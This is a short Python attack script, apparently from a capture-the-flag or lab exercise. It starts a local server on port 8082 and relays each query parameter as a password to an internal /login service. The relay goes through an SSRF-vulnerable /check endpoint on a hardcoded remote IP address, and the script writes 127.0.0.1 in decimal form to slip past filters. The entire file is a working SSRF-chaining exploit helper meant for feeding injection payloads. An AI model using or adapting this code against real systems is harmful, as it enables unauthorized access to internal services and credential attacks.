from http.server import SimpleHTTPRequestHandler
from socketserver import TCPServer
from urllib.parse import unquote, urlparse
import requests

http_server = "http://137.184.51.75/check"

# Start a web server to recieve the requests

def middleware_server(host_port,content_type="text/plain"):

	class CustomHandler(SimpleHTTPRequestHandler):
		def do_GET(self) -> None:
			self.send_response(200)
			try:
				payload = urlparse(self.path).query.split('=',1)[1]
			except IndexError:
				payload = False
				
			if payload:
				content = send_http(payload)
			else:
				content = 'No parameters specified!'
			#return the response from content
			self.send_header("Content-type", content_type)
			self.end_headers()
			self.wfile.write(content.encode())
			return

	class _TCPServer(TCPServer):
		allow_reuse_address = True

	httpd = _TCPServer(host_port, CustomHandler)
	httpd.serve_forever()

def send_http(payload):
	payload2 = "url=http%3A%2F%2F2130706433%3A5000%2Flogin%3Fusername%3D1%26password%3D{payload}&submit=Submit+Query".format(payload=payload)
	headers = {"Content-Type": "application/x-www-form-urlencoded"}
	r = requests.post(http_server, data=payload2, headers=headers)
	return r.text

print("[+] Starting MiddleWare Server")
print("[+] Send payloads in http://localhost:8082/?id=*")

try:
	middleware_server(('0.0.0.0',8082))
except KeyboardInterrupt:
	pass